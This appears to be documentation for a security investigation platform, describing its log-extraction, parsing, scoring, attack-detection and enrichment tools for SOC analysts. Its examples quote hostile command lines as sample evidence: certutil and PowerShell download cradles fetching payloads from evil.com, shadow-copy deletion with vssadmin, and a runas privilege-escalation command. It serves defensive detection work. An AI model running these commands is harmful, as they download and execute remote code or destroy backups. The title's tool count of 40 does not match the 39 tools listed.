# Every Tool in Zovark (All 40)

Zovark has 40 investigation tools organized into 6 categories. Think of them as specialists on a detective team: some gather evidence, some analyze it, some read specific file formats, some calculate risk scores, some detect specific attack patterns, and some connect the dots to bigger pictures.

Every tool is a deterministic Python function. No AI is involved in tool execution -- they follow strict rules, every time, with the same input producing the same output. The AI only decides *which* tools to run; the tools themselves are pure logic.

---

## Category 1: Extraction (8 tools)

Extraction tools are the evidence collectors. They scan raw text -- usually log data from a SIEM -- and pull out specific pieces of information, like a detective pulling fingerprints from a crime scene.

### extract_ipv4

**What it does:** Finds all IPv4 addresses (like 192.168.1.100) in text.

**When it is used:** Nearly every investigation plan. IP addresses are the most common indicator of compromise. Used in brute_force, ransomware, c2_communication_hunt, lateral_movement, and 15+ other plans.

**What it looks at:** Raw log text, scanning for the pattern of four numbers separated by dots.

**What it returns:** A list of IP addresses with evidence_refs (pointers back to the exact log line where each IP was found).

**Real-world example:** A brute force alert comes in. extract_ipv4 finds 185.220.101.45 in "500 failed SSH logins from 185.220.101.45." That IP becomes an IOC (indicator of compromise) in the final verdict.

**Risk impact:** High. The IPs found here feed directly into scoring tools, known-bad lookups, and cross-investigation correlation. Missing an IP means missing a threat.

### extract_ipv6

**What it does:** Finds IPv6 addresses (the newer, longer format like 2001:0db8:85a3::8a2e:0370:7334).

**When it is used:** Same plans as extract_ipv4, but less frequently triggered since most SIEM logs still use IPv4.

**What it looks at:** Raw log text, looking for the colon-separated hexadecimal format.

**What it returns:** A list of IPv6 addresses with evidence_refs.

**Real-world example:** A cloud infrastructure alert contains connections from an IPv6 address in AWS. extract_ipv6 catches it even though extract_ipv4 would miss it entirely.

**Risk impact:** Medium. Attackers occasionally use IPv6 to bypass monitoring that only watches IPv4.

### extract_domains

**What it does:** Finds domain names (like evil-login.com or updates.legit-company.net) with TLD validation.

**When it is used:** Phishing, C2 communication, data exfiltration, DNS exfiltration, supply chain compromise.

**What it looks at:** Raw log text, matching strings that look like domain names and validating they have real top-level domains (.com, .net, .org, etc.).

**What it returns:** A list of domains with evidence_refs.

**Real-world example:** A phishing email alert contains "Click here to verify: https://g00gle-security.xyz/login". extract_domains pulls out "g00gle-security.xyz" which later gets flagged by the phishing scorer.

**Risk impact:** High. Malicious domains are the backbone of phishing, C2, and exfiltration attacks.

### extract_urls

**What it does:** Finds full web addresses (http, https, ftp) including paths and parameters.

**When it is used:** Phishing investigation, data exfiltration, supply chain, LOLBin abuse.

**What it looks at:** Raw log text, matching URL patterns with protocol, domain, path, and query strings.

**What it returns:** A list of complete URLs with evidence_refs.

**Real-world example:** An alert shows "certutil.exe -urlcache -split -f https://evil.com/payload.exe". extract_urls captures the full download URL, which is critical evidence of LOLBin abuse.

**Risk impact:** High. Full URLs reveal not just the domain but the specific malicious payload or credential harvesting page.

### extract_hashes

**What it does:** Finds file fingerprints -- MD5 (32 chars), SHA1 (40 chars), and SHA256 (64 chars) hashes.

**When it is used:** Ransomware triage, DLL sideloading, supply chain compromise, credential access, process injection.

**What it looks at:** Raw log text, looking for hexadecimal strings of exactly 32, 40, or 64 characters.

**What it returns:** A list of hashes with their type (MD5/SHA1/SHA256) and evidence_refs.

**Real-world example:** A ransomware alert includes "Process hash: a1b2c3d4e5...". extract_hashes captures this, which later gets checked against known malware hashes.

**Risk impact:** High. File hashes are the most reliable way to identify known malware -- a specific hash matches one and only one file.

### extract_emails

**What it does:** Finds email addresses in text.

**When it is used:** Phishing investigation, insider threat detection, cloud infrastructure, API key abuse.

**What it looks at:** Raw log text, matching the standard user@domain.tld pattern.

**What it returns:** A list of email addresses with evidence_refs.

**Real-world example:** A phishing alert contains "From: ceo@company-update.biz To: finance@acme.com". extract_emails pulls both addresses. The sender address feeds into domain reputation checks.

**Risk impact:** Medium. Email addresses help identify both attackers (sender spoofing) and targets (who is being phished).

### extract_usernames

**What it does:** Finds usernames from common SIEM patterns (like "user=jsmith" or "Account Name: admin").

**When it is used:** Brute force, privilege escalation, lateral movement, insider threat, credential access, kerberoasting, WMI lateral.

**What it looks at:** Raw log text, looking for username patterns specific to Windows Event Logs, Linux auth logs, and SIEM formats.

**What it returns:** A list of usernames with evidence_refs.

**Real-world example:** A brute force alert shows "Failed login for user=root from 10.0.0.5, Failed login for user=admin from 10.0.0.5". extract_usernames finds both "root" and "admin", revealing the attacker is trying multiple accounts.

**Risk impact:** High. Knowing which accounts are targeted helps assess severity -- an attack on "admin" is worse than an attack on "guest".

### extract_cves

**What it does:** Finds CVE identifiers (like CVE-2024-1234) -- standardized vulnerability IDs.

**When it is used:** When alerts reference specific software vulnerabilities.

**What it looks at:** Raw log text, matching the CVE-YYYY-NNNN format.

**What it returns:** A list of CVE IDs with evidence_refs.

**Real-world example:** A supply chain alert contains "Exploit attempt for CVE-2024-3094 (xz backdoor)". extract_cves captures the CVE, linking the alert to a known vulnerability database entry.

**Risk impact:** Medium-High. CVE IDs instantly identify the vulnerability being exploited, helping analysts prioritize patching.

---

## Category 2: Analysis (4 tools)

Analysis tools measure and decode. Where extraction tools find things, analysis tools answer questions about what was found -- how many, how random, what encoding.

### count_pattern

**What it does:** Counts how many times a regex pattern appears in text. Think of it as "Control+F with counting."

**When it is used:** Almost every plan. Counts failed logins (brute force), urgency words (phishing), encryption keywords (ransomware), etc.

**What it looks at:** Raw log text, using a specific regex pattern provided by the plan.

**What it returns:** A number -- the match count.

**Real-world example:** The brute force plan counts matches for "fail|denied|invalid|error|rejected". If the count is 500, the risk score goes through the roof. If it is 3, it is probably a typo.

**Risk impact:** Critical. The count directly feeds into scoring tools. 5 failed logins is a typo; 500 is an attack.

### calculate_entropy

**What it does:** Measures the randomness (Shannon entropy) of a string. High randomness means the text looks like gibberish, which is suspicious.

**When it is used:** C2 communication hunt, network beaconing, DNS exfiltration.

**What it looks at:** A single string, usually a domain name.

**What it returns:** A number from 0 to ~8. Normal English words score around 3-4. Random-looking domains (like xk7q2m9p.evil.com) score 5+.

**Real-world example:** A DNS query alert contains the domain "a7f2k9x1m3.data-service.net". calculate_entropy returns 4.8, suggesting this domain was algorithmically generated (DGA -- domain generation algorithm), a common C2 technique.

**Risk impact:** High for network threats. DGA domains are a hallmark of malware communication.

### detect_encoding

**What it does:** Checks if text contains base64, hex, or URL encoding -- ways attackers disguise malicious commands.

**When it is used:** Data exfiltration detection, PowerShell obfuscation.

**What it looks at:** Raw log text, looking for patterns typical of encoded data.

**What it returns:** What types of encoding were found and where.

**Real-world example:** A data exfiltration alert shows a DNS query with "aGVsbG8gd29ybGQ=" in the subdomain. detect_encoding identifies this as base64, suggesting data is being smuggled out via DNS.

**Risk impact:** High. Encoding is one of the primary ways attackers hide their tracks.

### check_base64

**What it does:** Finds base64-encoded strings and decodes them, revealing hidden content.

**When it is used:** PowerShell obfuscation, data exfiltration.

**What it looks at:** Raw log text, identifying valid base64 strings and decoding them.

**What it returns:** The decoded content alongside the original encoded string.

**Real-world example:** A PowerShell alert shows "powershell -enc SQBFAFgAIAAoAE4A...". check_base64 decodes this to "IEX (New-Object Net.WebClient).DownloadString('https://evil.com/payload')" -- revealing a download cradle.

**Risk impact:** Critical for obfuscation attacks. Without decoding, the actual malicious command stays hidden.

---

## Category 3: Parsing (5 tools)

Parsing tools are translators. They take messy, format-specific log lines and turn them into clean, structured data that other tools can work with.

### parse_windows_event

**What it does:** Parses Windows Event Log entries (key=value format) into structured fields.

**When it is used:** Ransomware, kerberoasting, golden ticket, DLL sideloading, LOLBin abuse, lateral movement, WMI lateral, process injection, PowerShell obfuscation.

**What it looks at:** Raw log lines in Windows Event format.

**What it returns:** A dictionary with clean fields like EventID, AccountName, LogonType, ProcessName.

**Real-world example:** A raw log says "EventID=4769 ServiceName=MSSQLSvc TicketEncryptionType=0x17". parse_windows_event turns this into structured data so detect_kerberoasting can check if 0x17 (RC4) encryption was used.

**Risk impact:** High. Windows events are the primary data source for Active Directory attacks.

### parse_syslog

**What it does:** Parses standard Linux syslog format into structured fields.

**When it is used:** When alerts come from Linux/Unix systems.

**What it looks at:** Raw syslog lines (timestamp, hostname, process, message).

**What it returns:** Structured fields: timestamp, hostname, process, PID, message.

**Real-world example:** "Apr 7 14:23:01 webserver sshd[12345]: Failed password for root from 10.0.0.5" becomes structured data with hostname=webserver, process=sshd, message about the failure.

**Risk impact:** Medium. Essential for Linux-based alerts.

### parse_auth_log

**What it does:** Parses authentication log entries -- login attempts, successes, failures.

**When it is used:** Brute force, privilege escalation, credential access, RDP tunneling.

**What it looks at:** Auth log lines from Linux PAM, Windows Security, or SIEM-normalized formats.

**What it returns:** Structured fields: action (success/failure), username, source_ip, method (password/key/token).

**Real-world example:** "Failed password for admin from 203.0.113.50 port 22 ssh2" becomes action=failure, username=admin, source_ip=203.0.113.50, method=password.

**Risk impact:** High. Auth logs are the primary evidence for credential attacks.

### parse_dns_query

**What it does:** Parses DNS query logs into structured fields.

**When it is used:** Network beaconing, DNS exfiltration.

**What it looks at:** DNS query log lines from various formats.

**What it returns:** Structured fields: queried domain, query type (A, AAAA, TXT, MX), source IP, response.

**Real-world example:** A DNS log shows a TXT query for "encoded-data.evil.com". parse_dns_query structures this so detect_dns_exfiltration can analyze the query pattern.

**Risk impact:** High for exfiltration detection. DNS is often overlooked by traditional security tools.

### parse_http_request

**What it does:** Parses web request logs into structured fields.

**When it is used:** API key abuse.

**What it looks at:** HTTP access log lines (Apache/Nginx/IIS format).

**What it returns:** Structured fields: HTTP method, path, status code, source IP, user agent, response size.

**Real-world example:** "POST /api/v1/admin/users 401 from 45.33.32.156" becomes method=POST, path=/api/v1/admin/users, status=401, source_ip=45.33.32.156 -- revealing an unauthorized API access attempt.

**Risk impact:** Medium. Important for web application and API attacks.

---

## Category 4: Scoring (6 tools)

Scoring tools are the risk calculators. They take evidence from earlier steps and produce a risk score from 0 (harmless) to 100 (critical emergency). Think of them as the insurance adjusters of cybersecurity.

### score_brute_force

**What it does:** Calculates brute force risk based on failed login count, number of unique source IPs, and time window.

**When it is used:** Brute force plan.

**What it looks at:** failed_count, unique_sources, timespan_minutes.

**What it returns:** Risk score 0-100.

**Real-world example:** 500 failed logins from 3 different IPs in 60 minutes scores around 95. 5 failures from 1 IP in 120 minutes scores around 15.

**Risk impact:** Direct. This score becomes a primary factor in the final verdict.

### score_phishing

**What it does:** Calculates phishing risk based on URL count, suspicious domain count, credential form presence, and urgency language.

**When it is used:** Phishing investigation plan.

**What it looks at:** url_count, suspicious_domains, has_credential_form, has_urgency_language.

**What it returns:** Risk score 0-100.

**Real-world example:** An email with 3 URLs, 2 suspicious domains, a credential form, and "ACT NOW" language scores around 90. A newsletter with 1 URL and no suspicious indicators scores around 10.

**Risk impact:** Direct. Determines whether a phishing alert is escalated or dismissed.

### score_lateral_movement

**What it does:** Calculates lateral movement risk based on the method used (PsExec, WMI, etc.), admin share access, remote execution, and pass-the-hash usage.

**When it is used:** Lateral movement detection, WMI lateral.

**What it looks at:** method, is_admin_share, is_remote_exec, uses_pass_the_hash.

**What it returns:** Risk score 0-100.

**Real-world example:** PsExec to an admin share with pass-the-hash scores near 100. Unknown method with no indicators scores around 20.

**Risk impact:** Direct. Lateral movement is how attackers spread from one compromised machine to the entire network.

### score_exfiltration

**What it does:** Calculates data theft risk based on bytes transferred, external destination, off-hours activity, and encryption.

**When it is used:** Data exfiltration detection, insider threat detection.

**What it looks at:** bytes_transferred, is_external_dest, is_off_hours, is_encrypted.

**What it returns:** Risk score 0-100.

**Real-world example:** 500MB transferred to an external IP at 2 AM over an encrypted channel scores near 100. 1KB to an internal server during business hours scores near 5.

**Risk impact:** Direct. Data exfiltration is often the final stage of an attack -- the actual damage event.

### score_c2_beacon

**What it does:** Calculates command-and-control risk based on connection timing regularity, average interval, connection count, and domain randomness.

**When it is used:** C2 communication hunt, network beaconing.

**What it looks at:** interval_stddev (how regular the timing is), avg_interval_seconds, connection_count, domain_entropy.

**What it returns:** Risk score 0-100.

**Real-world example:** Connections every 60 seconds (low stddev) to a high-entropy domain with 200+ connections scores near 95. Irregular connections to a normal domain score near 15.

**Risk impact:** Direct. C2 beaconing means an attacker has persistent control of a machine.

### score_generic

**What it does:** A general-purpose scorer when no specialized scorer exists. Uses indicator counts and severity levels.

**When it is used:** Cloud infrastructure, supply chain, privilege escalation, DLL sideloading, LOLBin abuse, process injection, RDP tunneling, PowerShell obfuscation, credential access, API key abuse.

**What it looks at:** indicators_found, high_severity_count, medium_severity_count.

**What it returns:** Risk score 0-100.

**Real-world example:** 10 high-severity indicators scores around 85. 2 medium-severity indicators scores around 30.

**Risk impact:** Direct. The default scorer for attack types that do not have specialized scoring logic.

---

## Category 5: Detection (12 tools)

Detection tools are the specialists. Each one knows the specific patterns of one type of attack. They look at the full SIEM event (not just raw text) and determine whether attack-specific indicators are present.

### detect_kerberoasting

**What it does:** Detects Kerberoasting -- an Active Directory attack where an attacker requests service tickets encrypted with weak RC4 to crack offline.

**When it is used:** Kerberoasting plan.

**What it looks at:** The SIEM event for RC4 encryption (0x17), TGS ticket requests (Event 4769), SPN enumeration, and non-krbtgt service targets.

**What it returns:** Detection score, matched indicators, and MITRE technique T1558.003.

**Real-world example:** A Windows Event 4769 shows a TGS request with EncryptionType=0x17 for a service account. detect_kerberoasting flags this because legitimate systems use AES, not RC4.

**Risk impact:** High. Kerberoasting can silently compromise service accounts that often have admin-level privileges.

### detect_golden_ticket

**What it does:** Detects Golden Ticket attacks -- forged Kerberos tickets that give an attacker unlimited access to Active Directory.

**When it is used:** Golden ticket plan.

**What it looks at:** The SIEM event for forged TGT indicators, abnormal ticket lifetimes, RC4 encryption, and krbtgt account anomalies.

**What it returns:** Detection score, matched indicators, and MITRE technique T1558.001.

**Real-world example:** A Kerberos authentication event shows a ticket with a 10-year lifetime (normal is 10 hours). detect_golden_ticket flags this as a likely forged ticket.

**Risk impact:** Critical. A golden ticket means total domain compromise -- the attacker effectively owns the network.

### detect_ransomware

**What it does:** Detects ransomware by looking for shadow copy deletion, mass encryption patterns, ransom note creation, and backup destruction.

**When it is used:** Ransomware triage plan.

**What it looks at:** The SIEM event for vssadmin, bcdedit, wbadmin commands, mass file rename patterns, and encryption indicators.

**What it returns:** Detection score, matched indicators, and MITRE techniques T1486, T1490.

**Real-world example:** Logs show "vssadmin delete shadows /all" followed by hundreds of files being renamed to .encrypted. detect_ransomware scores this near 100.

**Risk impact:** Critical. Ransomware can cripple an entire organization in minutes.

### detect_phishing

**What it does:** Detects phishing by analyzing suspicious URLs, credential harvesting indicators, typosquatted domains, and social engineering patterns.

**When it is used:** Phishing investigation plan.

**What it looks at:** The SIEM event for suspicious URLs, login forms, urgency language, sender reputation.

**What it returns:** Detection score, matched indicators, and MITRE techniques T1566.001, T1566.002.

**Real-world example:** An email contains a link to "microsoft-verify-account.xyz/login" with "Your account will be suspended in 24 hours." detect_phishing flags the typosquatted domain and urgency language.

**Risk impact:** High. Phishing is the number one initial access vector for breaches.

### detect_c2

**What it does:** Detects command-and-control communication by analyzing beacon intervals, DGA (domain generation algorithm) domains, and encoded payloads.

**When it is used:** C2 communication hunt, network beaconing.

**What it looks at:** The SIEM event for regular connection intervals, high-entropy domains, encoded traffic.

**What it returns:** Detection score, matched indicators, and MITRE techniques T1071, T1573.

**Real-world example:** A host connects to "x7k2m9.update-service.biz" every 60 seconds, sending small encoded payloads. detect_c2 flags the regular interval and high-entropy domain.

**Risk impact:** Critical. C2 means an attacker has persistent, real-time control of a system.

### detect_data_exfil

**What it does:** Detects data exfiltration -- the actual theft of data from the organization.

**When it is used:** Data exfiltration detection, insider threat detection.

**What it looks at:** The SIEM event for large transfer volumes, external destinations, off-hours activity, cloud storage uploads, encoded transfers.

**What it returns:** Detection score, matched indicators, and MITRE techniques T1041, T1048.

**Real-world example:** At 2 AM, a workstation sends 2GB of data to a Mega.nz upload endpoint. detect_data_exfil flags the combination of off-hours, large volume, and cloud storage destination.

**Risk impact:** Critical. This is often the "damage event" -- the moment data actually leaves the organization.

### detect_lolbin_abuse

**What it does:** Detects "Living Off the Land" binary abuse -- attackers using legitimate Windows tools (certutil, mshta, bitsadmin, rundll32) for malicious purposes.

**When it is used:** LOLBin abuse plan, PowerShell obfuscation plan.

**What it looks at:** The SIEM event for suspicious use of built-in Windows tools, especially download commands, script execution, and DLL loading.

**What it returns:** Detection score, matched indicators, and MITRE techniques T1218.

**Real-world example:** Logs show "certutil.exe -urlcache -split -f https://evil.com/malware.exe". certutil is a legitimate certificate tool, but -urlcache is being abused as a file downloader.

**Risk impact:** High. LOLBin attacks bypass application whitelisting because the tools are legitimate Microsoft binaries.

### detect_com_hijacking

**What it does:** Detects COM object hijacking -- a persistence technique where attackers modify Windows registry entries to load malicious DLLs.

**When it is used:** Privilege escalation hunt.

**What it looks at:** The SIEM event for registry modifications to CLSID keys, InprocServer32 changes, and suspicious DLL paths.

**What it returns:** Detection score, matched indicators, and MITRE technique T1546.015.

**Real-world example:** A registry change sets a CLSID InprocServer32 value to "C:\Users\Public\malware.dll" instead of a legitimate system DLL.

**Risk impact:** High. COM hijacking survives reboots and runs automatically when applications load the hijacked COM object.

### detect_encoded_service

**What it does:** Detects malicious Windows services that use base64-encoded PowerShell commands to hide their true purpose.

**When it is used:** Lateral movement detection plan.

**What it looks at:** The SIEM event for service creation events with base64 or encoded commands in the service binary path.

**What it returns:** Detection score, matched indicators, and MITRE technique T1543.003.

**Real-world example:** A new service is created with ImagePath="cmd /c powershell -enc aQBlAHgAIAAoAG4A...". detect_encoded_service flags the encoded payload hidden in the service configuration.

**Risk impact:** High. Encoded services provide persistent, hidden backdoor access.

### detect_token_impersonation

**What it does:** Detects token impersonation and RunAs abuse -- where an attacker steals or fakes another user's security token to gain their privileges.

**When it is used:** Privilege escalation hunt.

**What it looks at:** The SIEM event for RunAs usage, token manipulation, SeDebugPrivilege, and impersonation indicators.

**What it returns:** Detection score, matched indicators, and MITRE technique T1134.001.

**Real-world example:** Logs show a low-privilege user running "runas /savecred /user:DOMAIN\admin cmd.exe" to execute commands as a domain admin.

**Risk impact:** High. Token impersonation lets attackers escalate from a compromised low-privilege account to admin.

### detect_appcert_dlls

**What it does:** Detects AppCert DLL persistence -- where attackers register malicious DLLs that get loaded into every new process.

**When it is used:** Privilege escalation hunt.

**What it looks at:** The SIEM event for registry modifications to the AppCertDLLs key, suspicious DLL paths.

**What it returns:** Detection score, matched indicators, and MITRE technique T1546.009.

**Real-world example:** A registry modification adds a DLL path under "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs". This DLL will load into every new process on the system.

**Risk impact:** High. AppCert DLLs provide deep persistence that is difficult to detect without registry monitoring.

### detect_dns_exfiltration

**What it does:** Detects DNS-based data exfiltration -- where attackers smuggle stolen data out through DNS queries, which are often unmonitored.

**When it is used:** DNS exfiltration plan.

**What it looks at:** The SIEM event for high-entropy subdomains, TXT record abuse, unusually long DNS queries, and high query volumes to a single domain.

**What it returns:** Detection score, matched indicators, and MITRE techniques T1048.003, T1071.004.

**Real-world example:** A host makes 1,000 DNS TXT queries to "a7f2k9.evil.com", "b8g3l0.evil.com", "c9h4m1.evil.com". The random-looking subdomains are actually encoded stolen data. detect_dns_exfiltration flags the high entropy, TXT abuse, and volume.

**Risk impact:** Critical. DNS exfiltration is one of the stealthiest data theft methods because most firewalls allow DNS traffic freely.

---

## Category 6: Enrichment (4 tools)

Enrichment tools provide context. They connect findings from the current investigation to bigger pictures -- threat intelligence, past investigations, MITRE frameworks, and analyst knowledge.

### map_mitre

**What it does:** Maps MITRE ATT&CK technique IDs (like T1110) to their human-readable names (Brute Force) and tactics (Credential Access).

**When it is used:** The final step of every investigation plan. Maps attack techniques to the standard security framework.

**What it looks at:** A list of technique IDs provided by the plan.

**What it returns:** Technique names, descriptions, and associated tactics.

**Real-world example:** The brute force plan passes ["T1110", "T1110.001", "T1110.003"]. map_mitre returns "Brute Force / Password Guessing / Password Spraying" under the "Credential Access" tactic.

**Risk impact:** Medium. Does not change the risk score, but provides the standard language that SOC analysts use to communicate about threats.

### lookup_known_bad

**What it does:** Checks an IOC (IP, domain, hash) against a local threat intelligence database of known malicious indicators.

**When it is used:** Phishing, ransomware, C2 communication, cloud infrastructure, supply chain, DLL sideloading, process injection, RDP tunneling, API key abuse.

**What it looks at:** A single value (IP, domain, or hash) checked against the known-bad list.

**What it returns:** Whether it was found, the threat category, and the threat score.

**Real-world example:** extract_ipv4 found 185.220.101.45 in a brute force alert. lookup_known_bad checks it and returns "known Tor exit node, threat_score=85" -- confirming this is malicious infrastructure.

**Risk impact:** High. A match against known-bad intelligence can immediately confirm a true positive.

### correlate_with_history

**What it does:** Checks whether any IOCs from the current investigation appeared in previous investigations. This is the tool that queries the entity graph.

**When it is used:** Nearly every plan -- typically the second-to-last step.

**What it looks at:** A list of IOC values and a lookback window (24 to 168 hours depending on the plan).

**What it returns:** Prior investigation IDs, verdicts, and risk scores where the same IOCs appeared.

**Real-world example:** IP 203.0.113.50 was found in today's C2 alert. correlate_with_history reveals this same IP appeared in a supply chain compromise investigation 3 days ago with risk_score=85. This cross-investigation link dramatically increases confidence that this IP is malicious.

**Risk impact:** Very high. Repeat offenders across multiple investigations are strong indicators of persistent threats.

### lookup_institutional_knowledge

**What it does:** Checks entities against analyst-provided baselines -- information about what is "normal" in this specific organization.

**When it is used:** Insider threat detection.

**What it looks at:** A list of entities (usually usernames) checked against the institutional knowledge database.

**What it returns:** Whether the entity has known baselines, expected behavior, active hours, and analyst notes.

**Real-world example:** An insider threat alert flags user "jsmith" for after-hours data access. lookup_institutional_knowledge returns "jsmith is a night-shift DBA, expected hours 22:00-06:00, approved for large data transfers." The risk score drops because this behavior is normal for this specific user.

**Risk impact:** Critical for reducing false positives. Without institutional knowledge, normal behavior gets flagged as suspicious.
